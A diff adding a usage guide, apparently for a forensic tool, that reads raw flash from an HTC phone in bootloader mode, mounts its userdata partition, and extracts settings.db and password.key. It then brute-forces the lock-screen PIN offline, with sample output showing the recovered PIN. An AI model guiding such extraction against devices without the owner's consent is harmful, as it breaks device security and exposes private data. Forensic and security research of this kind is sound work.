@@ -1,0 +1,76 @@
+PRELIMINARY
+===========
+
+1. Create folders. "mnt" is used to have our virtual device in it where a read in it corresponds to a read in the raw device. "mnt2" is used as a mounting point to mount the raw device as an ext2 partition.
+
+$ mkdir mnt mnt2
+
+2. Prepare cache files to hold the copies of bytes already got from the raw device.
+
+$ cd out
+$ ./create.sh
+
+USE
+===
+
+1. Start phone in bootloader mode (HBOOT) and connect it to the computer
+2. Setup USB serial for this device
+
+$ lsusb
+Bus 002 Device 002: ID 0e0f:0002 VMware, Inc. Virtual USB Hub
+Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub
+Bus 001 Device 003: ID 0bb4:0c94 High Tech Computer Corp. 
+Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub
+# modprobe usbserial vendor=0xbb4 product=0xC94
+
+3. (Optional) Check that everything is fine with screen
+
+# screen /dev/ttyUSB0
+hboot>h
+...
+
+4. Run the usb program. "-f" option tells to run in the foreground and "mnt" for the starting folder for our FS.
+
+# ./usb -f mnt
+
+5. Mount the (simulated) raw device in the mounting point and get the interesting files you want. Alternatively, use the "extract.sh" script file.
+
+# time mount -o loop,ro -t ext2 mnt/dev mnt2
+
+real	3m46.201s
+user	0m0.000s
+sys	0m0.004s
+
+# ls mnt2
+app  app-private  backup  dalvik-cache	data  dontpanic  drm  local  lost+found  misc  property  system  tombstones
+
+5. Alternatively, use the "extract.sh" script file.
+
+# sh extract.sh 
+Mouting userdata partition...
+
+real	3m46.201s
+user	0m0.000s
+sys	0m0.004s
+Processing: mnt2/data/com.android.providers.settings/databases/settings.db...
+
+real	6m54.722s
+user	0m0.000s
+sys	0m0.008s
+Processing: mnt2/system/password.key...
+
+real	0m16.038s
+user	0m0.000s
+sys	0m0.004s
+Done.
+
+6. After use, unmount the raw device and the FUSE device
+
+# umount mnt2
+# umount mnt
+
+7. Bruteforce the PIN code (offline)
+
+# python bf_password.py 
+Starting bruteforce...
+Found password: 1337
